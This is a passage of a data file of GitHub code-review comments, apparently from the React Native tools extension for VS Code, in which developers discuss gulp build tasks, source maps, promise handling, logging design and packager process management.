(e) { callback(e) })\n        .pipe(sourcemaps.write('.', {\n            includeContent: false,\n            sourceRoot: function (file) {\n                return path.relative(path.dirname(file.path), __dirname + '/src');\n            }\n        }))\n        .pipe(gulp.dest(outPath));\n});\n``\n. The change looks good, but I don't see the build failing in TravisCI. What happened to the other PR you had open to fix the build task?\n. @digeff I just sent you an updated gulp task proposal on the other PR, let me know if that works.\n. Thanks for pushing and testing it!\n. Looks good to me.\n. \ud83d\udc4d \n. @mroswald Thanks for your contribution and for using our extension. Do not hesitate to contact us if you find any issues or have feature suggestions!\n. LGTM!\n. How about \"react-native\"? @digeff Thoughts?\n. How are these language ids used?\n. We should be consistent with our import style.\n. Does the runner always deploy to simulator? What component is in charge of devices?\n. How about caching the file once we read it and parse it?\n. I think they do see it when they first choose the launch configuration.\n. Would removing them make sense then?\n. Agreed. TS gulpfiles are hard to maintain.\n. Would it be painful right now to set this to true? Once we add more code, there is probably no going back.\n. @nisheetjain Thoughts?\n. I think everyone is used to double by now from TACO. The rest looks very good.\n. Would it be a good idea to extract this code handling the folder, and lines 29-43 handling the file to file utility methods returning promises?\n. I would also addtslintto the default task. If someone wants to just build, they can invokegulp builddirectly.\n. I would advise against that. It is very easy to release and to forget updating the hardcoded version number. I think it's safer to have one extra file copy with each release then having a bug.\n. If they both fail, it is hard to read through the mixed log. I can change it back if you feel strongly about running concurrently.\n. Fixing...\n. Agreed. I'll remove the return.\n. What is the expected behavior in this case?\n. Agreed.\n. Since the source mapping issue is both critical and fragile at the same time, I think we should meet and talk about it. We can make a plan and reach common sense about what we accept as valid source map URLs, what we know works, and what should be the plan for cases that do not work out of the box. @nisheetjain @digeff @MSLaguana \n. Based on that discussion, I will be more than happy to add tests, since this is one of the most important components of the extension.\n. Me, @digeff and @MSLaguana met about this and these are the conclusions:\n- the react packager removes the misplaced source map URLs scattered through the file;\n- the packager adds one single line at the end of the script containing the source map URL;\n- VS Code expects relative URLs so that is what we will use\n. It is a real dependency and I will remove it. I will try the same with websocket. If there are any other dependencies we can dispose of,  please call them out.\n. I think for logging we are fine with static. I don't see us mocking that class for tests, so we should be good here.\n. These should be removed once we complete the packager task. They were added to the prototype because of timing issues.\n. Agreed.\n. Sounds good.\n. Modified. Thanks!\n. I tried an example using this approach but after updating the host and protocol thepathandhrefproperties are not updated unfortunately.\n. Agreed. Removing the commented code until then. @meenakb \n. I implemented a retry strategy based on @MSLaguana's snippet. The default values are:retryCount: 10,delay: 1000. This waits for 10 seconds for the packager to start. Do you think we need more time?\n. Changed to async.\n. Done.\n. @nisheetjain Is linux supposed to be supported?\n. I think this is useful to the users as well. They are debugging also, right?\n. I replacedrequestwithhttp.request. I seewsis not a node internal module but a separate package. Does it have any advantage overwebsocket?\n. All handlers use the same function declaration so the parameter needs to stay.\n. Good idea.\n. I added one more optional parameter tologErrorto log the stack.\n. @digeff no. Thanks!\n. I changed to 30 retries with 2s delay. That sums it up to 60s.\n. As agreed, I commented it out for now.\n. Removed.\n. I think for this we need input from our PM, and it it not high priority for now. We will show the running command only, without any decorators.\n. Agreed.\n. Removing. Thanks!\n. @digeff hates statics due to mocking difficulties. We should talk about this.\n. Done. I added a new interface for the arguments. When we add a new one, we should add it to the interface and the parsing function.\n. Maybe we should pass it as a parameter torunAppinstead of associating the platform with a single project. Would this work for you?\n. The script importer changes will come in a later PR.\n. The script importer changes will come in a later PR.\n. The script importer changes will come in a later PR.\n. The script importer changes will come in a later PR.\n. The script importer changes will come in a later PR.\n. The script importer changes will come in a later PR.\n. Based on our discussion, this is not possible with the current vscode styles.\n. Modified. Thanks!\n. I added a new interface for this.\n. I moved it toandroidfolder. How do you feel about using only lowercase names for folders? (iosvsiOS)\n. Fixed.\n. And return what if there are no dependencies?\n. That would be inconsistent with the actualpackage.jsonfile. I feel we should leave it as is.\n. Done.\n. Done.\n. @MSLaguana I addressed this with another comment. @digeff I thinkpackage.jsonshould be the source of truth, right? We use the same approach for Cordova withconfig.xml. \n. @digeff Changed from execute to spawn.\n. @digeff I confirmed with the CodePush guys that it is not common to change your app name outside of package.json, because some RN commands stop working well.\n. I don't think we should make promises. We should just say that the feature is not available yet.\n. We use\"simulator\"and\"device\"strings more than once. How about extracting them to constants?\n. Is this brute-force search method the only way to find the.plistfile?\n. What is the scenario in which we find multiple candidates? If this is prone to happen, we should think of a different solution.\n. Even more, this seems like a general purpose function for finding files by extension. I would pass the root and the extension as parameters and move the implementation to one of the utility files.\n. We could modify theLog.getErrorMessageimplementation to accommodate the.error` property like this:\njavascript\npublic static getErrorMessage(e: Error): string {\n        return e && e.message || e && e.error || e && e.toString() || \"\";\n    }\nand leave the original call in place. (Log.logError(\"Cannot debug application.\", reason);)\nWould this be enough for this scenario?\n. I think the desktopPlatform should be part of the IRunOptions interface, and not composed with IMobilePlatform.\n. What is the status of using ws instead? (I know we already talked about this, we should inform the other members of the team as well :) )\n. Do you mean \"reply\"?\n. What object type are you expecting? We should create an interface for this type. Also, we should gracefully handle parser errors, null object, etc.\n. Why do we still need the 3s delay when starting the worker?\n. My understanding was that we are not going to be downloading the worker anymore. Did that change?\n. Thanks for fixing this. \n. This would show the message anyway. If we really want to enable this feature, we should implement a filtering mechanism that is enabled by default.\n. There is a NodeModule interface in node.d.ts. https://github.com/DefinitelyTyped/DefinitelyTyped/blob/master/node/node.d.ts#L56\n. Don't forget to remove this comment.\n. This class does more than just downloading content. It changes the source map URLs. I feel like Importer is a better name than Downloader.\n. Why no outputChannel.show() in this situation? Would it make sense to extract the output channel logging to the logging class?\n. The previous implementation had a package.json file system watcher that was activated when the file was edited. This helped in the case where you open a new project that does not have the RN dependency yet, but you add it later. Is this handled automatically now?\n. @digeff I agree with @MSLaguana , the list of files would not help the users.\n. @meenakb @MSLaguana sounds good.\n. It's fine if we don't have the same semantics. We could go with the generic Manager but Importeris more meaningful to the implementation.\n. Are we missing a .done() since we don't return the promise here?\n. This returns a promise, we should return it or .done() it. I vote for the first option. \n\nThe Golden Rule of done vs. then usage is: either return your promise to someone else, or if the chain ends with you, call done to terminate it. Terminating with catch is not sufficient because the catch handler may itself throw an error. (from here: https://github.com/kriskowal/q/wiki/API-Reference)\n. We can make this async as well if you change the previous one.\n. Sounds good.\n. :+1: \n. If you Q.nfcall<string>(...) there is no need to cast.\n. .done() at the end since this now returns a promise. Thanks for making the change.\n. If this is intended to be async, we need a .done(). Else, if we need the tsconfig.json updates before continuing, we should all the install code to a .then() like this:\n\njavascript\nTsConfigHelper.compileJavaScript(true)\n.then(()=>{\n/* install typings ... */\n}).done();\n. Given the vscode Disposable interface is synchronous, I would not be comfortable doing that. I looked online at the API reference but could not find details on how this works. The best bet would be probably to look at the source code, but that can change.\n. Nice trick. Thanks.\n. Fixing.\n. Fixing.\n. Fixing.\n. Both? :)\n. They are debug artifacts, not build artifacts. I thought of a lot of names, and I think this will be intuitive to users once they see it. It's under .vscode, so it must be vscode related. It's named .react, so it must be react related.\n. It definitely exists on mac, I double checked.\n. I think we need a better name for this. I would also appreciate a brief comment (either here or the class description) that explains how the piping works in the new worker.\n. How about ApplicationMessage or RNDebugMessage?\n. onSocketOpened\n. onSocketClose\n. onMessage\n. nit: its folder\n. This should be synchronous, we need to delete before returning. What is your concern around exceptions?\n. I think this is good. The variable should represent the action (verb) the code does. Something like INIT_SANDBOX_MESSAGING or similar.\n. Fixed.\n. Do you mean writing without comparing contents? That was my initial implementation but @nisheetjain suggested this optimization. The most common scenario will probably be reading the file and comparing contents. I assume that is less expensive than writing it all the time.\n. I synced up offline with @digeff to clarify and he is referring to rules around code formatting. We can have a discussion with the team and see if there are other tslint rules we can apply for enforcing even more formatting rules (for ex: always starting a .then on the next line).\n. I think PROCESS_MESSAGE_INSIDE_SANDBOX is good.\n. I think both are good. \n. A little message validation would be safer here. \n. Can we have a fallback mechanism to another port in case this port is not available?\n. Could we use the .react folder for this purpose?\n. The target platform / target application platform ?\n. Nevermind, people will confuse it with the target property if we change the description.\n. Typo: \"description\"\n. Typo\n. Would it make sense to double check with the Code team to make sure they are not planning any internal API changes in the near future that would break us?\n. I wonder if we can offer a button here as well for restarting VS Code. I found some code that does this in the vs code repo, it seems like they are using something similar to workbench.action.reloadWindow (I took this id from the keyboard shortcuts file). Would this be enough for your scenario?\njavascript\nvscode.commands.executeCommand(\"workbench.action.reloadWindow\");\n. Classes should start with capital letters.\n. We should at least log this as a warning and continue.\n. This retry call is very compact code. Breaking it up into pieces and passing them as parameters to the retryAsync call would make it easier to read.\n. nit: missing semicolon?\n. Another place where we could emphasize the early release is the version field. We could use alpha or beta version.\n. Are we missing a final else? Can there be a case where code is nonzero and signal equal to \"SIGTERM\"?\n. I did a little reading about it in the node docs which say \"SIGTERM is not supported on Windows, it can be listened on.\", so I guess that would be good enough for this scenario. I'm just double checking if you tried it on Windows as well.\n. Why was this change necessary?\n. e can be null or undefined.\n. If we cannot parse the version we bail out on starting the packager?\n. What is the chances of this happening?\n. This can be up the tree as well, not just in the same folder.\n. static\n. You can get the same result with string comparisons. No splitting, no parsing.\nversion>=\"0.19.0\"\n. That was my assumption as well. However, looking at the release dates, 0.9.0 was released in 2015-08-15, which could break the logic.\n. The changes you made to the logging mechanism.\n. Sounds good, I was under the impression that this method is still public.\n. We tried to keep the platform checks in the command executor. Can you move this as is, in a killPackager method there? I see more and more instances in the code where we need to check the host platform, and we will need to refactor in the future to our initial design of having a IHostPlatform abstraction.\n. This is another example of checking the platform that we will need to abstract in the future. I will add this as a task for the next sprint. LGTM!\n. I think it's fine as it is as long as we will change it to use semver in the next version.\n. Can't the debugger process parse settings.json or the extension process parse launch.json programmatically?\n. Could we use xcrun simctl spawn booted launchctl stop here instead? What is the advantage of kill?\n. Updating to read from launch.json.\n. Adding TODO.\n. Agreed.\n. Keeping in mind that we will probably not have a lot of messages, and most of them without arguments, do you still think we need to create an interface for each method type?\n. Again I think this is overengineering for this feature. @MSLaguana @meenakb what do you guys think?\n. What would be the utility of polling? Where do you see this information being used in the product? We can certainly display progress with the current design as well - the server will not return until the operation is not finished.\n. @MSLaguana @joshuaskelton @guillaumejenkins @meenakb Thoughts?\n. I like that.\n. The extensionMessaging.ts file is common and does not depend on vscode or the debugging environment. Do you mean to move the ExtensionMessageSender class outside?\n. I like REST style APIs but I think this is not the place to use them. If we do this we will end up putting even more logic in the server and the communication protocol (building paths, etc). What are the advantages do you think we will get by using separate paths for messages?\n. I added a dictionary.\n. Is there anything blocking us from consuming result.outcome?\n. Nice. Is this added for consistency or is it really needed?\n. Method names should start with verbs, not nouns.\n. Please address all TODOs before merging to master.\n. runFunction?\n. Also, is the assumption that we are always going to call this with a void | Promise<void> returning function okay? How about making it generic and returning the actual result of the operation?\n. The name here is a little confusing. It should reflect the purpose of the class, which is telemetry and error reporting.\n. Just a heads up - I removed this part of the code in my PR. Whoever merges second will have to handle conflicts.\n. Should we print a warning here? @MSLaguana \n. Wouldn't it be easier just to push(reactDirManager) first and to return reactDirManager.create() after?\n. Renamed. We add them here so that it's easier for users to change the default values. If no value is specified, the default is used.\n. I updated the handler type to take parameters instead of an array. This way, whatever you send to the server should match the arguments on the message handler.\n. I disagree. The ScriptImporter is responsible with downloading scripts from the packager and saving them to disk, no matter what they are used for. It is a much better place for this logic than the Packager class, where I moved it from.\n. Wouldn't it be easier to mock the SettingsHelper in tests if we want to do that?\n. Agreed.\n. Fixed.\n. Fixed.\n. Fixed.\n. Sounds good, but we should open a tracking issue and tag all TODOs with the issue number.\n. I would prefer calling it EntryPointHandler or something similar then. \n. @MSLaguana ?\n. Added.\n. @digeff This is a user provided value. We make the best effort to parse it, whether it is a string or a number. We used any because compilation fails if you pass anything other than string to parseInt. \n. @MSLaguana Based on our discussion, I added a comment in package.json to reflect the need of restarting VSCode if the port changes.\n. I added a comment about this in package.json to make sure the values are in sync. For your described scenario, they would need to find a common internal port that is available.\n. Not sure what you mean here. Q.Promise instead of Q.Promise?\n. I disagree, we should be able to return values here. We wouldn't want to modify the communication protocol later.\n. Chaning.\n. That is what removePathRecursivelyAsync does internally - removes a directory or a file, if they exist.\n. Good idea, I'll introduce an error marker.\n. nit: succeed\n. We can use the present tense in the description (i.e. \"This class transforms\")\n. Class names usually don't start with verbs.\n. Can the process run out of memory if the output buffer is large? What is the limit here?\n. Why not pass in the actual patterns here and not the generating functions?\n. I disagree. The adb parsing logic here is done with a regex in 10 lines of code. The rest of this PR is business logic. I don't think we should go take a new dependency for this much code.\n. Is indexOf efficient on a big errorsAndOutput string?\n. This is no longer a failure pattern - you can safely remove it.\n. Why do we need both success and failure patterns? Isn't the absence of any failure sufficient?\n. How many times is this function called if it weren't for the limiter?\n. Can we run into memory problems if we don't dispose of the context? How many times is this expected to happen for one debugging session? Could we maybe use cluster to host each sandbox in a new process like this? http://stackoverflow.com/questions/11652530/node-js-vm-how-to-cancel-script-runinnewcontext/11713088#11713088\n. Indeed. Same is here: https://github.com/facebook/react-native/blob/182e97a62ca0677ae4940ac5f88199ec73ce6295/local-cli/runAndroid/runAndroid.js#L105\n. This contains the device id as well. It is not just the status.\n. Allright, the package name is hardcoded. I was looking at the activity name. That's an easy fix.\n. I think code clarity is more important than duplicating one line of code.\n. They are not reused outside of this function. Why would you want to expose them inside this class?\n. Agreed.\n. We can do that since there are only two possible states.\n. I added a null check for runOptions as well, such that now there are no assumptions whatsoever about the arguments. I personally like writing null proof methods since the calling code might change in the future.\n. See comment below.\n. Agreed.\n. Fixed.\n. I moved part of this implementation to the runApp method.\n. Any reason for which this is not a gulp task but a function?\n. An easy way to fix tslint erros as you go is to install the tslint vscode extension. It helps me save a lot of time before checking in.\n. Check this out: http://stackoverflow.com/questions/8614356/using-verbs-in-class-names\nI think a better name would be OutputProcessor, or something similar.\n. Would this import fail if Log is used from the debugged process context?\n. Would it be a good idea to move this class to the extension folder since it references \"vscode\"?\n. If we pass the logger directly here to the constructor instead of the outputChannel, we could remove the \"vscode\" import from this common class.\n. Same here. I searched the code for \"vscode\" usages in the common folder and the 3 classes I found are the Packager, EntryPointHandler and CommandExecutor.\n. I would replace this method with a logWithCustomLogger(logger: ILogger, message: string, formatMessage: boolean) one. This way we don't lose functionality and we remove the \"vscode\" dependency from here as well.\n. We could pass a custom logger to the packager constructor and use the logWithCustomLogger instead.\n. Will this work on windows? The packager is killed differently on windows.\n. I did not test on linux, so I don't know yet. I looked online for documentation on how to set env variables and that's what I used. We should probably dedicate some time to testing everything on Linux.\n. I verified that it is not defined on OSX to maintain existing code logic. However, I think we can also have internal users on other platforms, so assuming it is defined on other platform configurations, we should be fine.\n. getLogCatArguments?\n. It is deliberate - tslint would complain - it checks for break or return before case statements.\n. We always go into debugging mode when we use this class, why do we need to lazy initialize this?\n. My understanding was that this would not be an error case anymore. Why do we still need it? If there are multiple devices, we provide a workaround both for running and debugging.\n. If the build fails, we don't continue, regardless of the error.\nIf the build succeeds and we have multiple emulators (which we can detect without parsing the log), we then continue and pick our target.\n. This change should be part of that PR then.\n. F1 does the same thing and it's cross platform. :+1: \n. It's nice that we are reusing code here but we should have it the other way around in order not to confuse users. I would call the common function from two declared gulp tasks. It's easier to understand and follow if we define tasks the same way.\n. Check err for null?\n. Any advantage for using this function instead of string.match()?\n. Another way of going would be to merge the ISpawnInfo and ISpawnOptions interfaces. We only use them in this file, and we always use them together.\n. @MSLaguana @digeff Nice proposal.\n. This will not work on *nix.\n. Do we want this to be configurable? Will it work on unix systems?\n. The exit code will take care of reporting errors to gulp via the callback, while the error output will be   streamed to the console via process.stderr. To my knowledge, there is no error event on process.\n. But there is one on child_process which is what we are using here. :) Let me take care of that.\n. I believe it can be accessed both ways. \n. I think we already get that for free.\n. Do we actually need to check for the file? Won't line 9 fail if the .map file is not found?\n. What is the relationship between the vscode package version and the VSCode IDE version? What I am trying to figure out is how often should we update this package, or if it should be in sync somehow with the VSCode versions we support.\n. You should create a separate utility method for parsing process arguments and place it in a new or existing test utility class.\n. This is misleading. I would either use patternIndex for both comparisons or patternIndex + 1.\n. Your naming pattern is inconsistent. In the previous file, you named the member childProcess, which is different from the actual node module (child_process). Here, you used exactly the name of the node module (fs) for the member and you renamed the import. We need better naming conventions for these situations.\n. nit: only the applicationName needs to be converted to lowercase\n. I don't see any usages of this method. Beware that folders must be empty before deleting. If you want to delete recursively, you can use removePathRecursivelyAsync instead, which deletes both files and folders.\n. How is this composedFrom field used in tests?\n. Line 7 blocks the extension process every time we load the extension, we should really understand if we take a load performance hit here. \n. The default build should be production, not debug.\n. Is this constructor intentionally empty? We should add a comment with an explanation if yes.\n. Isn't the project path unique and sufficient? Why do we also need the user id?\n. I would move this method to HostPlatform entirely.\n. All the methods in this class are 1 line long. Why did we need to refactor that code into a new class?\n. We should try to keep changes to a minimum this late in the release cycle.\n. I would keep the import statements consistent with the other files, using one line only.\n. Why are we changing the protocol here to send an empty array if the caller doesn't provide args?\n. Isn't compile time validation of the message enough for this purpose?\n. We already have a SettingsHelper class. I would move the only method of this class there.\n. In my opinion, it is not the responsibility of the ScriptImporter to override URLs. The callers should provide the right URL.\n. nit: For consistency, I would use one line imports.\n. We can use HostPlatform.getPlatformId() === HostPlatformId.WINDOWS instead to avoid strings.\n. This method is called in multiple instances, by both the Android and iOS platforms. Did you verify that all the scenarios still work as expected?\n. outcome is already a promise, you can merge this section with the next section.\n. Would waitForStart and waitForFinish names make more sense here?\n. I agree with Diego here. For clarity, I would throw and eliminate the INVALID platform id, since we only support Android and iOS. I would then change the checkTargetPlatformSupport implementation to handle the error and reject the promise.\n. I would replace this with targetPlatformId === TargetPlatformId.ANDROID || targetPlatformId === TargetPlatformId.IOS since we might support other platforms in the future, like Windows.\n. Same here.\n. Same here.\n. I like @joshuaskelton's suggestion to use two new Actual Behavior and Expected Behavior paragraphs instead of this one.\n. I think that is the right fix, making it optional.\n. I just tried a small example, and the compiler does not accept string instead of any[]. Again, we should fix this at compile time, not runtime.\n. You could create a new class that handles all the multiple instance scenarios, and I would have the worker use it when calling. Or add it to one of the utility classes. ScriptImporter should not care if we run one or multiple instances of VS Code.\n. I think we still need the Steps to Reproduce section before these two:\n```\nSteps to reproduce:\n1.\n2.\nActual Behavior:\nExpected Behavior:\n``\n. Agreed.\n. How aboutEnabling debugginginstead?\n. How about using this instead of parsing manually? http://stackoverflow.com/questions/23023650/is-it-possible-to-pass-a-flag-to-gulp-to-have-it-run-tasks-in-different-ways \n. The argument still holds, even though it is not used in the case of the multiple instance scenario. TheScriptImportershould not care if we use port forwarding or not.\n. Why are you lazy initializingtestin the constructor? Why not a member function?\n. Ismock-fsrelated to this change/PR? I couldn't find any usages.\n. This is fine.\n. It should be part of that PR then.\n. Done.\n. I think this name is fine.\n. No. The purpose of this is to block known targets on known incompatible host OS machines.\n. This is a big hack.buildshould fail in case of compilation errors, andtestshould not run. We should make the right fix here, which is fixing thebuild` task if it does not report errors correctly.\n. I don't think it's worth keeping the enum just for this use case.\n. ",
    "meenakb": "Done.\n. Put the sample application under a \"test\" folder.\n. test\\SampleApplication\n. :+1: \n. Applied Jimmy's offline comment.\n. :+1: \n. Rest all look good to me.\n. Actually, there is a tslint rule - \"member-ordering\": [true,\n        \"public-before-private\"\n    ]\nshould make sure that the order is not regressed.\n. @nisheetjain, thanks for catching this. Fixing.\n@dlebu, No idea really, was just using the Finder on Mac :)\n. :+1: \n. :+1:\n. Awesome @dlebu!\n. :+1: \n. @MSLaguana, @digeff - Feedback applied. Can you please take a look?\n. :+1: \n. I hit this as well\n. The problem is actually with the previous \"unfinished\" promise for \"react-native start --port 8081\". So, when the second command for killing the started process is triggered, the unfinished promise is flushed and is causing an error to be printed. I have a fix for it.\n. :+1: \n. Note that there are no telemetry events in nodeDebugWrapper.\n. :+1: \n. @dlebu, @MSLaguana - Can you guys take a look? I have now localized the fix to packager process only.\n. Great find! :+1: \n. While you are at it, please remove the \"private\" flag as well.\n. Good point, in that case please add it to vscode-cordova as well\n. :+1: \n. @symmetriccurve, thanks for providing more information. When you encounter this issue, do you see any message/error in the Output window of VS Code?\n. :+1: \n. :+1: \n. :+1: \n. Updated PR!\n. :+1: \n. I see a pattern in missing \"_NT\" for Windows. Use os.platform() instead to avoid future errors.\n. :+1: \n. Looks awesome! :+1: \n. :+1: \n. LGTM\n. :+1: Nice addition, Diego!\n. No, as per our dicussion yesterday with Parashu, that is out of scope.\n. \n\nDoes this look better?\n. Documenting our offline discussion: Since we do catch fatal errors in the Packager after it has been started, it is more appropriate to use \"Started\" than \"Running\". \n. :+1: \n. Debugger owners @MSLaguana @dlebu & @digeff, can you guys vet this change as well?\n. :+1: \n. :+1: \n. :+1: \n. Another instance:\nCause - Build Failure\nError - Cannot Debug application : Unknown error\n. Additionally, an extraneous warning is thrown on:\n1. Start packager from the terminal\n2. From VS Code, start the packager\nExpected: ######### Packager is already running. ##########\nActual:\n### Packager is already running.\n[Warning] Debugging is not supported if the React Native Packager is not started within VS Code. If debugging fails, please kill other active React Native packager processes and retry.\n. :+1: :+1: :+1: \n. :+1: \n. :+1: \n. :+1: \n. looks good\n. :+1: \n. :+1: \n. :+1: \n. Is it possible to remove dependency on \"request\" and use node's http.request instead? If I remember correctly, \"request\" package brings in lot of dependent packages \n. Seems like this is a devDependency only. So, this can stay.\n. \"message\" not used?\n. Some comments about the steps and the magic 3 second delay would be helpful.\n. Remove src/typings/lodash/lodash.d.ts\n. Appears to be a util class, in which case all its methods can be static.\n. As far as I can tell, there is no straight-forward way to distinguish between stderr and stdout. \n. OutputChannel.show() will keep the output console open until OutputChannel.hide() is called. So, there is no need to call it again. However, I like the idea of extracting the logging part to Logger class.\n. We discussed about this. @MSLaguana and I felt that is not a normal workflow. I will check with Parashuram.\n. Do we show the different simulator targets in the debugger target dropdown?\n. hmmm, fair point. We can probably register the commands but in the handlers show an error indicating that the project is not a react-native project.\n. Agreed, fixing.\n. Done.\n. It is, we now return the child process spawned. And yes, it is. All we need is a handle to the spawned process. We can query its state later :)\n. Good point, yes.\n. I would leave this as is for now.\n. Per discussion with @MSLaguana  and @dlebu, changing Android and iOS platform handlers to use ReactNativeCommandExecutor instead.\n. Good catch, yes!\n. :+1: \n. Can't require \"vscode\" in the debug process. This is a core common code.\n. I like that idea. Done.\n. Would be good to have JS Doc comments for public methods.\n. Good point, we should include this as part of the packager - so we need to include in.\n. But the environment will be set only when we make an attempt at debugging, right? In which case, it would make sense to do the patching here. Thoughts?\n. hmmm, I believe we should not stop people from being able to continue to use Chrome tools for debugging just because it is open in VS Code.\n. done!\n. yes, we could do that. We (@MSLaguana, @dlebu and me) had a discussion about the other possible cases this morning. There are cases where user explicitly installs the node nodules in a path higher up. But, there is no efficient way of covering that case unless we rewrite the require logic.\n. Done.\n. Thanks for fixing this, @joshuaskelton :)\n. Good catch, @digeff!\n. Just comment this task out with a TODO. That will be easier to track.\n. Done.\n. That is correct.\n. We have rule no-var-requires enabled in tslint.json for vscode-react-native. However, since the Sender \"module\" is not directly under \"node_modules\" and since there is no type information for it available, we would hit a compile time error. Hence, the rule has been temporarily disabled here.\n. I like that suggestion. Fixed!\n. Our extension overwrote this, which got checked out. Removing.\n. Done.\n. Do we care about the errors when plist is not found?\n. generator.step(\"packager.start\"); ?\n. Is there a specific reason for using two promise chains, here?\n. Do we ever invoke enableSalsa with a \"true\" argument? If not, we could just return false on Ln 123 and not pass an argument. \n. You could just stash the isRestartRequired boolean value to a local variable and pass it only to the real consumer - warnIfRestartIsRequired, that way you could avoid passing it to the intermediate methods (installTypescriptNext, configureWorkspaceSettings and installReactNativeTypings).\n. We could skip reading if we just wrote it in the previous step.\n. provides a development environment\n. from the command palette\n. @MSLaguana is correct. We will have to remove the \"Important Notice\" section.\n. This gif is missing.\n. This was actually intentional. The idea was to exit silently without resolving/rejecting in the case of a kill signal, as detailed in the comments above. The reason is we do not want either \"Command finished successfully\" or \"Command failed\" messages which are extraneous. Thoughts?\n. @dlebu, thanks for pointing out. I will double-check on Windows as soon as I get back to work.\n. @MSLaguana, thats fair. I will refactor these methods. Closing this PR.\n. We will need to make sure that the telemetry events are sent before exiting the process.\n. Additionally, how about suggesting the users to run \"react-native upgrade\"?\n. @joshuaskelton would know this part. But, os.type() should work as well. Check this - https://nodejs.org/api/os.html#os_os_type\n. No, here we are checking if the packager was just started. We want to differentiate between the two cases 1. Packager was already running and 2. Packager was just started and log a meaningful status.\n. I like the Warning: prefix.\n. Documenting our discussion: @MSLaguana and I had a chat and we decided to use childProcess Helper instead of calling child_process.spawn. However, the point of this method is the isolate the fix to to React Native's packager start command. I am for refactoring the CommandExecutor and ChildProcess for more appropriate strategies. But, that kind of refactoring should wait for V1.\n. I will move this to the top - however, tslint does not seem to complain :-s\n. @digeff - this.packagerProcess.kill(), does not kill the process,on Windows. A relevant thread here - http://stackoverflow.com/questions/23706055/why-can-i-not-kill-my-child-process-in-nodejs-on-windows\n. @dlebu, that makes sense. Will move this.\n@digeff This is Windows only. Adding relevant omments\n. Addressed feedback.\n. Do we need a seperator (eg, \":\") between the message and postfi?\n. Is this an intentional change?\n. Yes, we should ideally remove this method altogether. I have a task for this.\n. Watch out for casing issues - this should be \"../common/log\"\n. Is this intentionally removed?\n. Should this be a more generic telemetry event, rather than \"launchDebuggerError\"?\n. :+1:  for this structure\n. duh, you are right\n. Looks like all async code paths have been converted to be promisy now. In that case, do we still need codeGeneratingTelemetry to be of a non-thenable type?\n. if codeGeneratingTelemetry can be generic type T, what is the behavior of invoking finally on it?\n. I see, thanks for clarifying.\n. ah, very cool!\n. Correct, I resorted to this way of detection for the very reason you have mentioned. I do agree that returning the write function directly would be more meaningful.\n. The problem with the boolean approach is that it is not extensible; Currently we can write either to\n1. process.stdout 2. console 3. OutputChannel. We should have a design in place that can work for other log channels as well. I like the suggestion by @MSLaguana for the caller to pass the logging function to the Log class. That would be extensible and make the Log class much simpler.\n. It would be cleaner and extensible to go with the \"caller-passing-write-function\" method (delegate approach).\n. You will need to run \"gulp tslint\" and fix the tslint errors.\n. Should this be explicitly \"false\" as there will be no restart required?\n. That makes sense. Fixing.\n. No, I don't think Warnings need error codes.\n. I like that, changing.\n. Since logging is a common util, keeping it under common would make sense.\n. Removed unnecessary channel parameters.\n. This is for future use, when caller wants custom behavior.\n. This is for future use, when caller wants custom behavior.\n. Same here :)\n. There is no other way of calling this. You are right that we could keep this internal to the logWarning. But for consistency with logError method, I am keeping the same style.\n. At the entry point, we set the global logger for the extension process. If not, we default to the Console logger. In the past, we were erroneously creating multiple output channels with the same name and logging on it. This way, we will create the OutputChannel just once and use it.\n. @dlebu, we do not need to pass a logger as we are setting the global logger in each process.\n. Yes, its intended for the user.Using .vscode/settings.json instead makes sense. Changing.\n. The extension process and the packager process user the React-Native output channel and the debug process uses the console.\n. Cool, l am keeping that part for a separate PR.\n. Per @dlebu's suggestion moved out all vscode type references outside of common code.\n. Nit: Calling this the \"packageName\" is a bit misleading, especially since we are passing \"react-native\" as the argument whereas the actual package name that exposes the command is \"react-native-cli\". May be \"cliName\" ?\n. All the icons here - https://octicons.github.com/ can be used.\n. No, unless we explicitly call UpdateStatus (which in turn calls statusBarItem.show()), this will be hidden :)\n. True, looks perfect! Thank you!\n. I agree, \"Started\" sounds more appropriate.\n. How about taking the \"Typings\" folder out of the \"src\" folder and putting besides src? That way we will not have to duplicate the typings?\n. No, that is not a good design.\n. Where is this used?\n. Yep, there was one instance - childProcess.ts:70 :)\n. I find this to be extraneous. How about just using a higher non-default logLevel as the bar for internal messages? \n. Awesome! This would immensely help with catching potential regressions with \"refactors\" :facepunch: \n. Agreed, will add a comment.\n. Interesting. :+1: \n. Agreed, I will dig into that :)\n. Do you mean here in appWorker.ts? \n. Yep, done.\n. I think we agreed on 200 as the line limit. 140 seems superficial to me. And I personally do not like \"string 1\" + ... just to circumvent this :) \n. You will get a merge error for this one as I just fixed this.\n. If you haven't already, install (comma)\n. :+1: \n. Put the error in errorStrings.json and use ErrorHelper.GetError\n. Leave it at \"React-Native version\". We are interested in react-native's version and NOT react-native-cli's version?\n. Then, make the title less ambiguous. \"React-native extension version\"? Also, wouldn't react-native version be a necessary data point?\n. Nice. nit: typo in words related to success - successfully, succeeds\n. +1 to @dlebu A generic method in the common folder should not have any assumptions on the usage. If you are making assumptions, then change the name of the method to indicate that - ex, \"rmEmptyDir\"\n. Is the intention to make fallthroughs a build error?\n. For the sake of readability, add comments around child_process /* require(\"child_process\") */\n. How about, \"React Native Tools extension needs React Native v0.19.0 or later to be installed in PROJECT_ROOT/node_modules/\" ?\n. Is \"getmac\" still used?\n. what is the difference between process.env.USERNAME/process.env.USER/process.env.LOGNAME\n? \n. Here and everywhere else, use the errorMessages.json to properly format the messages with error codes.\n. +1 to @joshuaskelton , why can't this be done in the constructor? Why do you need a separate method? I see only only call.\n. The packager?\n. Add this to errorMessages.json.\n. Fixed. :)\n. That would be the end-user experience. They will see \"Platform '{0}' is not supported on host platform: {1}\". Intermediate target platform value should be invalid.\n. I would like to keep this generic as it appears in both \"run\" and \"debug\" case.\n. @MSLaguana, @dlebu, @joshuaskelton, @hamiltonia, what do you guys think about the method name?\n. Yes, that would make sense.\n. I think keeping explicit sanity checking in the callers improve readability. I will keep this as is.\n. Good catch, Diego! TS never complained :-(\n. This should ideally be in the \"done\" handler of this method in the caller.\n. ",
